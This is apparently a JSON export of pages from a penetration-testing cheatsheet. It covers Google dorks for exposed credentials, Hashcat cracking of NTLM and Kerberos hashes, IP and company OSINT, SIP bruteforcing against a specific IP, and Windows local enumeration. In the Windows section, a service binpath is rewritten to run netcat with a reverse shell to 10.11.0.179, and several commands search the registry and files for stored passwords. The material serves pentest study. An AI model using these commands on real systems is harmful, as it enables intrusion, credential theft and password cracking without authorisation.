	"content": " Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com \u0026lt;searchterm\u0026gt; site:dl.dropbox.com \u0026lt;searchterm\u0026gt; site:s3.amazonaws.com \u0026lt;searchterm\u0026gt; site:onedrive.live.com \u0026lt;searchterm\u0026gt; site:cryptome.org \u0026lt;searchterm\u0026gt; # Admins credentials intext:company_keyword \u0026amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log \u0026amp; intext:\u0026#34;admin\u0026#34; | intext:\u0026#34;root\u0026#34; | intext:\u0026#34;administrator\u0026#34; \u0026amp; intext:\u0026#34;password\u0026#34; | intext:\u0026#34;root\u0026#34; | intext:\u0026#34;admin\u0026#34; | intext:\u0026#34;administrator\u0026#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.apec.fr direction \u0026lt;SOCIETE\u0026gt; # Financial reports \u0026#34;périmètre de consolisation\u0026#34;|\u0026#34;rapport de référence\u0026#34;|\u0026#34;rapport annuel\u0026#34; filetype:pdf # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Google Funny dorks site:http://trello.com site:*/boards site:http://trello.com password + admin OR username # Recon to find sensivite data site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://justpaste.it | site:http://pastebin.com | site:http://jsfiddle.net | site:http://trello.com \u0026#34;$TARGET\u0026#34; # Piwik Anonymous Access inurl:token_auth inurl:anonymous \nAutomated Dorks Tools # GoogD0rker (https://github.com/ZephrFish/GoogD0rker/) ./googD0rker-txt.py -d example.com # Goohak (https://github.com/1N3/Goohak/ # Just run it on a target domain ./goohak domain.com \nPagodo # Tool to gather dorks information and find potential vulnerable web pages # The first part is the scrapper which will get dorks and save them python3 ghdb_scraper.py -j -s # And then the tool to leverage data and try to find vulnerable pages # -d option can be used to target a domain python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1"
},
{
	"uri": "/passcracking-hashfiles/hashcat_cheatsheet/",
	"title": "Hashcat Cheatsheet",
	"tags": [],
	"description": "",
	"content": " MISC and tricks https://www.notsosecure.com/one-rule-to-rule-them-all/# MAX POWER # force the CUDA GPU interface, optimize for \u0026lt;32 char passwords and set the workload to insane (-w 4). # It is supposed to make the computer unusable during the cracking process # Finnally, use both the GPU and CPU to handle the cracking --force -O -w 4 --opencl-device-types 1,2 \nWrapcat - Automating hashcat commands https://twitter.com/Haax9_/status/1340354639464722434?s=20 https://github.com/Haax9/Wrapcat $ python wrapcat.py -m 1000 -f HASH_FILE.txt -p POT_FILE.txt --full --save \nAttack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 3 # Bruteforce : hash mask -a 6 # Hybrid wordlist + mask : hash dict mask -a 7 # Hybrid mask + wordlist : hash mask dict \nCharsets ?l # Lowercase a-z ?u # Uppercase A-Z ?d # Decimals ?h # Hex using lowercase chars ?H # Hex using uppercase chars ?s # Special chars ?a # All (l,u,d,s) ?b # Binary \nOptions -m # Hash type -a # Attack mode -r # Rules file -V # Version --status # Keep screen updated -b # Benchmark --runtime # Abort after X seconds --session [text] # Set session name --restore # Restore/Resume session -o filename # Output to filename --username # Ignore username field in a hash --potfile-disable # Ignore potfile and do not write --potfile-path # Set a potfile path -d # Specify an OpenCL Device -D # Specify an OpenCL Device Type -l # List OpenCL Devices \u0026amp; Types -O # Optimized Kernel, Passwords \u0026lt;32 chars -i # Increment (bruteforce) --increment-min # Start increment at X chars --increment-max # Stop increment at X chars \nExamples # Benchmark MD4 hashes hashcat -b -m 900 # Create a hashcat session to hash Kerberos 5 tickets using wordlist hashcat -m 13100 -a 0 --session crackin1 hashes.txt wordlist.txt -o output.pot # Crack MD5 hashes using all char in 7 char passwords hashcat -m 0 -a 3 -i hashes.txt ?a?a?a?a?a?a?a -o output.pot # Crack SHA1 by using wordlist with 2 char at the end hashcat -m 100 -a 6 hashes.txt wordlist.txt ?a?a -o output.pot # Crack WinZip hash using mask (Summer2018!) hashcat -m 13600 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d?d?d! -o output.pot # Crack MD5 hashes using dictionnary and rules hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rules # Crack MD5 using combinator function with 2 dictionnaries hashcat -a 1 -m 0 example0.hash example.dict example.dict # Cracking NTLM hashes hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\hashsample.hash \u0026#34;d:\\WORDLISTS\\realuniq.lst\u0026#34; -r OneRuleToRuleThemAll.rule # Cracking hashes from kerberoasting hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\krb5tgs.hash d:\\WORDLISTS\\realhuman_phill.txt -r OneRuleToRuleThemAll.rule# You can use hashcat to perform combined attacks # For example by using wordlist + mask + rules hashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -r rules/yourule.rule # Single rule used to uppercase first letter --\u0026gt; Marie2018 hashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -j \u0026#39;c\u0026#39; \nScenario - Cracking large files (eg NTDS.dit) # Start by making a specific potfile and cracked files (clean environment) # - domain_ntds.dit # - domain_ntds_potfile.pot # Goal is to run many different instances with different settings, so each one have # to be quite quick # You can generate wordlist using CeWL # It usually works pretty well cewl -d 5 -m 4 -w OUTFILE -v URL cewl -d 5 -m 4 -w OUTFILE -o -v URL # With some basic dictionnary cracking (use known wordlists) # rockyou, hibp, crackstation, richelieu, kaonashi, french and english .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 rockyou.txt --force -O # Then start to use wordlists + masks + simple rule # For special chars, you can use a custom charset : \u0026#34;?!%$\u0026amp;#-_@+=* \u0026#34; # Multiple tests, multiples masks and multiples wordlists (including generated ones) .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* \u0026#39;?d?d?d?d\u0026#39; -j c --increment --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* -1 .\\charsets\\custom.chr \u0026#39;?1\u0026#39; -j c --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* -1 .\\charsets\\custom.chr \u0026#39;?d?1\u0026#39; -j c --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* -1 .\\charsets\\custom.chr \u0026#39;?d?d?1\u0026#39; -j c --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* -1 .\\charsets\\custom.chr \u0026#39;?d?d?d?1\u0026#39; -j c --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 .\\french\\* -1 .\\charsets\\custom.chr \u0026#39;?d?d?d?d?1\u0026#39; -j c --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 6 CEWL_WORDLIST.txt -1 .\\charsets\\custom.chr \u0026#39;?d?d?d?d?1\u0026#39; -j c --force -O .\\hashcat64.exe ... # Same commands and behavior but using mask after the tested word (mode 7) .\\hashcat64.exe -m 1000 hashs.txt -a 7 \u0026#39;?d?d?d?d\u0026#39; .\\french\\* -j c --increment --force -O # Then, wordlists + complex rules # Once again run against multiple wordlists (including generated ones) # Kaonashi and OneRuleToRuleThemAll can produce maaaaaassive cracking time .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 french.txt -r .rules\\best64.rule --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 french.txt -r .rules\\OneRuleToRuleThemAll.rule --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 french.txt -r .rules\\best64.rule --force -O .\\hashcat64.exe ... # Then smart bruteforce using masks (custom charset can be usefull too) # Can be quite long, depending on the mask. Many little tests with different masks # Knowing for example that password is min 8 char long, only 8+ masks # Play by incrementing or decrementing char vs decimal (you can also use specific charset to reduce time) .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?d?d?d?d\u0026#39; --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?l?d?d?d\u0026#39; --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?l?l?d?d\u0026#39; --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 -1 .\\charset\\custom \u0026#39;?u?l?l?l?l?l?d?1\u0026#39; --force -O .\\hashcat64.exe ... # Then increment mask size and play again # Can be longer for 9 char and above.. Up to you to decide which masks and how long you wanna wait .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?d?d?d?d?d\u0026#39; --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?l?d?d?d?d\u0026#39; --force -O .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 3 \u0026#39;?u?l?l?l?l?l?d?d?d\u0026#39; --force -O .\\hashcat64.exe ... # If you have few hashes and small/medium wordlist, you can use random rules # And make several loops .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 wl.txt -g 1000000 --force -O -w 3 # You can use combination attacks # For example, combine different names, or combine names with dates.. Then apply masks # Directly using hashcat .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 1 wordlist1.txt wordlist2.txt --force -O # Or in memory feeding, it allows you to use rules but not masks .\\combinator.exe wordlist1.txt wordlist2.txt | .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 0 -rules .\\rules\\best64.rule --force -O # Or create the wordlist before and use it .\\combinator.exe wordlist1.txt wordlist2.txt .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot -a 6 combinedwordlist.txt \u0026#39;?d?d?d?d\u0026#39; -j c --increment --force -O # Finally use your already cracked passwords to build a new wordlist .\\hashcat64.exe -m 1000 hashs.txt --potfile-path potfile.pot --show | %{$_.split(\u0026#39;:\u0026#39;)[1]} \u0026gt; cracked.txt .\\hashcat64.exe -m 1000 hashs.txt -a 6 cracked.txt \u0026#39;?d?d?d?d\u0026#39; -j c --increment --force -O .\\hashcat64.exe -m 1000 hashs.txt -a 0 cracked.txt -r .rules\\OneRuleToRuleThemAll.rule --force -O # You can also checks the target in popular leaks to find some password # Then try reuse or rules on them"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/ip_address/",
	"title": "IP Address",
	"tags": [],
	"description": "",
	"content": " Getting Informations Whois and ASN # Get information on an IP whois \u0026lt;IP\u0026gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com https://whoisology.com # myip.ms can provie additional informations https://myip.ms/# Get ASN for your target bgp.he.net # Pear is a tool used to get informations about an AS https://github.com/routeur/Pear python3 Pear.py -a [ASNumber]# You can identify IP block owned by a company ipv4info.com# IP Reputation https://reputation.team-cymru.com/ Online Scanners # Shodan.io and Censys.io are also usefull # Keywords on Shodan https://beta.shodan.io/search/filters city:\u0026#34;Grenoble\u0026#34; country:\u0026#34;FR\u0026#34; geo:\u0026#34;21.452673,56.245212\u0026#34; server: \u0026#34;gws\u0026#34; hostname:\u0026#34;google\u0026#34; net:210.214.0.0/16 os:\u0026#34;windows 10\u0026#34; port:22 # https://github.com/jakejarvis/awesome-shodan-queries # Using a premium account, you can search by image https://images.shodan.io# Get information about the target IP https://www.onyphe.io/ # Robtex is a great and complete tool https://www.robtex.com# Zoomeye can be very efficient, but in Chinese https://www.zoomeye.org/ # BinaryEdge is also known and powerfull https://www.binaryedge.io/# Spyse can also be a good solution # But very limite in free plan https://spyse.com/ \nFinding real IP behind CloudFlare or Tor https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/\n# SSL Certificates # Using a given domain name # By using an SSL certificate between the server and CloudFlare, you can search for the real server # Search by \u0026#34;Certificates\u0026#34; https://censys.io/ # You need to search the certificates for target and show valid ones parsed.names: xyz123boot.com and tags.raw: trusted # Then for each result # Explore \u0026gt; What\u0026#39;s using this certificate \u0026gt; IPv4 Hosts # One of the servers could be the real one # Does it redirect ? # DNS Records # Even after moving to CloudFlare, some data-driven services still have old A records # SecurityTrails can do it (\u0026#34;historical data\u0026#34;) https://securitytrails.com/ # MX can also be a good way \nDomain Identification Dorks # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx Reverse DNS # Reverse DNS Resolution (also usefull for subdomains) for x in {1..255}; do host xx.xx.xx.$x; done # Knockknock is a small automated script allowing you to find domaine names # For a registrant (person or company) python3 k2.py -n company -d Online Services # Then you can find domains and subdomains associated to an IP by using Passive Reverse DNS https://www.virustotal.com/gui/home/search #RiskIQ Passive DNS # Many passive tests can be done # Reverse IP Lookup to find new domains http://www.ipvoid.com/ # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.info/reversewhois/ # Many tools (not onlt for IP but like, everything) https://intelx.io/ https://intelx.io/tools # Multi tool for IP, domains... https://osint.sh/ # Multi tools like DNS Tools, Network Tools, HTTP Tools, Database lookups https://w3dt.net//"
},
{
	"uri": "/other-systems/ipbx/",
	"title": "IPBX",
	"tags": [],
	"description": "",
	"content": "# You can browse to the following URL to get all users registered with an extension 178.33.47.167/panel/ # Sipvicious is a great tool to attack VoIP # You can bruteforce a special extension/account ./svcrack.py -u 2000 178.33.47.167 -d ./notre_dictionnaire -vv"
},
{
	"uri": "/open-source-intelligence-osint/company_investigations/company_informations/",
	"title": "Information Gathering",
	"tags": [],
	"description": "",
	"content": " Company Informations General # Find informations about a company https://opencorporates.com # Giant database projects containing many informations # Can be about leaks, offshore companies leaks etc https://aleph.occrp.org/ https://offshoreleaks.icij.org/ # Notices / Gazettes for EU companies http://opengazettes.com/ # Societe.ninja can give great informations about a company https://societe.ninja/ # Pappers.com is dedicated to French companies https://www.pappers.fr/ Financial \u0026amp; Administrative # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ https://www.infogreffe.fr/ https://www.crunchbase.com https://fr.kompass.com/ # European Justice Portal # Informations are not free https://e-justice.europa.eu Technical \u0026amp; Hosted # Find multiples sites owned by the same individual/company http://www.spyonweb.com # Look for reported vulnerabilities https://www.openbugbounty.org/ Jobs # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ Business # Call for tender → BOAMP https://www.boamp.fr/ # Brands https://www.inpi.fr/fr # Patents https://patentscope.wipo.int/search/en/search.jsf # Trading/Shipping overviews # Researching companies https://www.importgenius.com Geography # Cadastre FR https://cadastre.gouv.fr \nUK # Company Register # Very well documented https://beta.companieshouse.gov.uk/ \nChina # OSINT on Chinese companies https://www.octocheck.com/ \nSwitzerland https://gijn.org/2020/02/21/ou-trouver-des-donnees-en-suisse/ Federal Stats # Office Fédéral de la Statistique https://www.bfs.admin.ch/bfs/fr/home.html # STAT-TAB is another database where you can go further http://www.pxweb.bfs.admin.ch/ # Financial Stats https://www.efv.admin.ch/efv/fr/home/themen/finanzstatistik/uebersicht-staatsfinanzen.html # Taxation Stats https://www.estv.admin.ch/estv/fr/home/allgemein/steuerstatistiken/fachinformationen/steuerstatistiken.html # Unemployment Stats https://www.amstat.ch/v2/index.html # Import / Export https://www.gate.ezv.admin.ch/swissimpex/public/bereiche/waren/query.xhtml Companies # Central Commercial Index # You can get general informations about a company https://www.zefix.ch/ # Feuille Officielle Suisse du Commerce # More informations https://shab.ch/#!/gazette# FINMA (Autorité Fédérale de Surveillance des Marchés Financiers) # Blacklist for companies suspected of having an activity without autorisation https://www.finma.ch/fr/finma-public/liste-noire/ # In case of right violation, FINMA can publish it\u0026#39;s final decision # Containing potential personnal data of concerned people https://www.finma.ch/fr/mise-en-oeuvre/instruments-d-enforcement/publication-de-la-decision-finale/ # There is also a register containing ongoing decisions https://www.sesam.search.admin.ch/sesam-search-web/pages/search.xhtml# National Whois is still up to date for the moment and can give some informations https://www.nic.ch/ # National Archives have a lot a documents https://www.swiss-archives.ch/ Judiciary # Federal Court is publishing laws https://www.bger.ch/fr/index/juridiction/jurisdiction-inherit-template/jurisdiction-recht.htm # Same for Penal Court https://bstger.weblaw.ch/index.php Others # Getting press article archive https://www.e-newspaperarchives.ch/ # Projet \u0026#34;LoiTransparence\u0026#34; https://www.oeffentlichkeitsgesetz.ch/francais/ # LobbyWatch # Each member of parliament is reviewed for transparendy https://lobbywatch.ch/fr"
},
{
	"uri": "/windows-systems/local-and-physical/local_recon_enumeration/",
	"title": "Local Recon and Enumeration",
	"tags": [],
	"description": "",
	"content": " Tips # Powershell whoami $env:UserName # Display hidden files dir /a # Recursive dir dir /s # If you can\u0026#39;t browse a folder because of space char # You can use an old trick # It has to be 8 chars cmd\u0026gt; cd progra~1 cmd\u0026gt; cd progra~2 \nEnumeration - Host Information # Exact OS version type C:/Windows/system32/eula.txt type C:\\Windows\\System32\\drivers\\etc\\hosts# OS Arch systeminfo wmic qfe # Envionment variables ? DC on the logon server ? set powershell\u0026gt; Get-ChildItem Env: | ft Key,Value # Other connecte drives ? net use wmic logicaldisk get caption,description,providername powershell\u0026gt; Get-PSDrive | where {$_.Provider -like \u0026#34;Microsoft.PowerShell.Core\\FileSystem\u0026#34;}| ft Name,Root \nEnumeration - Network # NIC Connected ipconfig /all powershell\u0026gt; Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address powershell\u0026gt; Get-DnsClientServerAddress -AddressFamily IPv4 | ft # Routes route print powershell\u0026gt; Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex # ARP Cache arp -a powershell\u0026gt; Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State # Connection to other hosts netstat -ano # Hosts file C:\\WINDOWS\\System32\\drivers\\etc\\hosts # Firewall netsh advfirewall show allprofiles state netsh advfirewall firewall show rule name=all netsh advfirewall export \u0026#34;firewall.txt\u0026#34; # Is SNMP configured ? reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s powershell\u0026gt; Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse \nEnumeration - Users \u0026amp; Groups # SID for local user or logged in local user wmic useraccount where name=\u0026#39;username\u0026#39; get sid wmic useraccount where name=\u0026#39;%username%\u0026#39; get sid # SID for current logged in domain user whoami /user # SID for local administrator wmic useraccount where (name=\u0026#39;administrator\u0026#39; and domain=\u0026#39;%computername%\u0026#39;) get name,sid # SID for domain administrator wmic useraccount where (name=\u0026#39;administrator\u0026#39; and domain=\u0026#39;%userdomain%\u0026#39;) get name,sid # Find a username from a SID wmic useraccount where sid=\u0026#39;S-1-3-12-1234525106-3567804255-30012867-1437\u0026#39; get name # Looking for privileges and searching for one of these # SeBackupPrivilege, SeDebugPrivilege, SeTakeOwnershipPrivilege, SeTcbPrivilege # SeCreateToken Privilege, SeLoadDriver Privilege, SeImpersonate whoami /privnet users dir /b /ad “C:\\Documents and Settings” reg query “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon” 2\u0026gt;nul | findstr “DefaultUserName DefaultDomainName DefaultPassword” net user alice echo %username% # Get all users (old users?) net users dir /b /ad \u0026#34;C:\\Users\\\u0026#34; dir /b /ad \u0026#34;C:\\Documents and Settings\\\u0026#34; # Windows XP and below powershell\u0026gt; Get-LocalUser | ft Name,Enabled,LastLogon powershell\u0026gt; Get-ChildItem C:\\Users -Force | select Name # Informations about all local users powershell\u0026gt; Get-WmiObject -Class Win32_UserAccount -Filter \u0026#34;LocalAccount=1\u0026#34; | % {net user $_.Name} powershell\u0026gt; Get-LocalUser | %{net user $_.name} # Logged on users qwinsta quser # Groups powershell\u0026gt; Get-LocalGroup | ft Name powershell\u0026gt; Get-LocalGroupMember Administrators | ft Name, PrincipalSource # Get domain powershell\u0026gt; wmic computersystem get domain powershell\u0026gt; systeminfo | findstr /B /C:\u0026#34;Domain\u0026#34; # Domain # /dom could be a way to avoid endpoint solutions detection powershell\u0026gt; net user /dom powershell\u0026gt; net user /domain powershell\u0026gt; net user /domain \u0026lt;username\u0026gt; powershell\u0026gt; net group /domain # Get you own SID powershell\u0026gt; wmic useraccount where name=\u0026#39;\u0026lt;username\u0026gt;\u0026#39; get sid# Registry for user autologon ? reg query \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\u0026#34; 2\u0026gt;nul | findstr \u0026#34;DefaultUserName DefaultDomainName DefaultPassword\u0026#34; powershell\u0026gt; Get-ItemProperty -Path \u0026#39;Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0026#39; | select \u0026#34;Default*\u0026#34; # Credential Manager ? cmdkey /list dir C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ dir C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\ powershell\u0026gt; Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\ powershell\u0026gt; Get-ChildItem -Hidden C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\# Get domain SPN $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\u0026#34;\u0026#34;) $search.filter = \u0026#34;(servicePrincipalName=*)\u0026#34; $results = $search.Findall() foreach($result in $results) { $userEntry = $result.GetDirectoryEntry() Write-host \u0026#34;User : \u0026#34; $userEntry.name \u0026#34;(\u0026#34; $userEntry.distinguishedName \u0026#34;)\u0026#34; Write-host \u0026#34;SPNs\u0026#34; foreach($SPN in $userEntry.servicePrincipalName) { $SPN } Write-host \u0026#34;\u0026#34; } # Get user accounts which have SPN $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\u0026#34;\u0026#34;) $search.filter = \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\u0026#34; $results = $search.Findall() foreach($result in $results) { $userEntry = $result.GetDirectoryEntry() Write-host \u0026#34;User : \u0026#34; $userEntry.name \u0026#34;(\u0026#34; $userEntry.distinguishedName \u0026#34;)\u0026#34; Write-host \u0026#34;SPNs\u0026#34; foreach($SPN in $userEntry.servicePrincipalName) { $SPN } Write-host \u0026#34;\u0026#34; }# WMIC help wmic /? # patchlevel wmic qfe get Caption,Description,HotFixID,InstalledOn # Grep for particular patch wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\u0026#34;KB..\u0026#34; /C:\u0026#34;KB..\u0026#34; # Check typical files for passwords c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml # SYSVOL passwords... (msf or powersploit) # Other files that can contain passwords Services\\Services.xml ScheduledTasks\\ScheduledTasks.xml Printers\\Printers.xml Drives\\Drives.xml DataSources\\DataSources.xml \nEnumeration - Programs, Processes and Services tasklist /SVC schtasks /query /fo LIST /v net start accesschk_old.exe -uwcqv “Authenticated Users” * /accepteula accesschk_old.exe -ucqv upnphost sc qc upnphost sc config upnphost binpath= “C:\\Windows\\Temp\\nc.exe -nv 10.11.0.179 51337 -e C:\\Windows\\System32\\cmd.exe” sc config upnphost obj= “.\\LocalSystem” password= “” net stop upnphost net start upnphost Installed Software and permissions # Get installed software dir /a \u0026#34;C:\\Program Files\u0026#34; dir /a \u0026#34;C:\\Program Files (x86)\u0026#34; reg query HKEY_LOCAL_MACHINE\\SOFTWARE powershell\u0026gt; Get-ChildItem \u0026#39;C:\\Program Files\u0026#39;, \u0026#39;C:\\Program Files (x86)\u0026#39; | ft Parent,Name,LastWriteTime powershell\u0026gt; Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name # Full permissions for everyone or users ? icacls \u0026#34;C:\\Program Files\\*\u0026#34; 2\u0026gt;nul | findstr \u0026#34;(F)\u0026#34; | findstr \u0026#34;Everyone\u0026#34; icacls \u0026#34;C:\\Program Files (x86)\\*\u0026#34; 2\u0026gt;nul | findstr \u0026#34;(F)\u0026#34; | findstr \u0026#34;Everyone\u0026#34; icacls \u0026#34;C:\\Program Files\\*\u0026#34; 2\u0026gt;nul | findstr \u0026#34;(F)\u0026#34; | findstr \u0026#34;BUILTIN\\Users\u0026#34; icacls \u0026#34;C:\\Program Files (x86)\\*\u0026#34; 2\u0026gt;nul | findstr \u0026#34;(F)\u0026#34; | findstr \u0026#34;BUILTIN\\Users\u0026#34; # Also possible to do it using accesschk from sysinternals accesschk.exe -qwsu \u0026#34;Everyone\u0026#34; * accesschk.exe -qwsu \u0026#34;Authenticated Users\u0026#34; * accesschk.exe -qwsu \u0026#34;Users\u0026#34; * Processes and Services # Get processes and services tasklist /svc tasklist /v net start sc query powershell\u0026gt; Get-Process | where {$_.ProcessName -notlike \u0026#34;svchost*\u0026#34;} | ft ProcessName, Id powershell\u0026gt; Get-Service powershell\u0026gt; Get-WmiObject -Query \u0026#34;Select * from Win32_Process\u0026#34; | where {$_.Name -notlike \u0026#34;svchost*\u0026#34;} | Select Name, Handle, @{Label=\u0026#34;Owner\u0026#34;;Expression={$_.GetOwner().User}} | ft -AutoSize # Weak and reocnfigurable services ? accesschk.exe -uwcqv \u0026#34;Everyone\u0026#34; * accesschk.exe -uwcqv \u0026#34;Authenticated Users\u0026#34; * accesschk.exe -uwcqv \u0026#34;Users\u0026#34; * # Service list, many output wmic service list for /f \u0026#34;tokens=2 delims=\u0026#39;=\u0026#39;\u0026#34; %a in (\u0026#39;wmic service list full^|find /i \u0026#34;pathname\u0026#34;^|find /i /v \u0026#34;system32\u0026#34;\u0026#39;) do @echo %a \u0026gt;\u0026gt; c:\\windows\\temp\\permissions.txt for /f eol^=^\u0026#34;^ delims^=^\u0026#34; %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \u0026#34;%a\u0026#34;# ANy Unquoted Service paths ? wmic service get name,displayname,pathname,startmode 2\u0026gt;nul |findstr /i \u0026#34;Auto\u0026#34; 2\u0026gt;nul |findstr /i /v \u0026#34;C:\\Windows\\\\\u0026#34; 2\u0026gt;nul |findstr /i /v \u0026#34;\u0026#34;\u0026#34; powershell\u0026gt; gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \u0026#34;Auto\u0026#34; -and $_.PathName -notlike \u0026#34;C:\\Windows*\u0026#34; -and $_.PathName -notlike \u0026#39;\u0026#34;*\u0026#39;} | select PathName,DisplayName,Name# Scheduled Tasks schtasks /query /fo LIST 2\u0026gt;nul | findstr TaskName dir C:\\windows\\tasks powershell\u0026gt; Get-ScheduledTask | where {$_.TaskPath -notlike \u0026#34;\\Microsoft*\u0026#34;} | ft TaskName,TaskPath,State# Startup wmic startup get caption,command reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce dir \u0026#34;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\u0026#34; dir \u0026#34;C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\Startup\u0026#34; powershell\u0026gt; Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl powershell\u0026gt; Get-ItemProperty -Path \u0026#39;Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; powershell\u0026gt; Get-ItemProperty -Path \u0026#39;Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026#39; powershell\u0026gt; Get-ItemProperty -Path \u0026#39;Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#39; powershell\u0026gt; Get-ItemProperty -Path \u0026#39;Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\u0026#39; powershell\u0026gt; Get-ChildItem \u0026#34;C:\\Users\\All Users\\Start Menu\\Programs\\Startup\u0026#34; powershell\u0026gt; Get-ChildItem \u0026#34;C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup\u0026#34;# Dump process memory from PowerShell # Powershell procdump https://gist.github.com/jlawhon/faac02887526746aff468436dc54043d \nEnumeration - Files dir /a /s *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *local.txt* findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs 2\u0026gt;nul type “C:\\Documents and Settings\\Administrator\\Desktop\\proof.txt”# Passwords in the registry reg query HKCU /f password /t REG_SZ /s reg query HKLM /f password /t REG_SZ /s # Unattended files or sysprep not cleaned ? dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2\u0026gt;nul powershell\u0026gt; Get-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like \u0026#34;*.xml\u0026#34; -or $_.Name -like \u0026#34;*.txt\u0026#34; -or $_.Name -like \u0026#34;*.ini\u0026#34;)}# On IIS, what\u0026#39;s in inetpub, web.config ? dir /a C:\\inetpub\\ dir /s web.config C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config powershell\u0026gt; Get-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue # IIS logs C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].log C:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].log 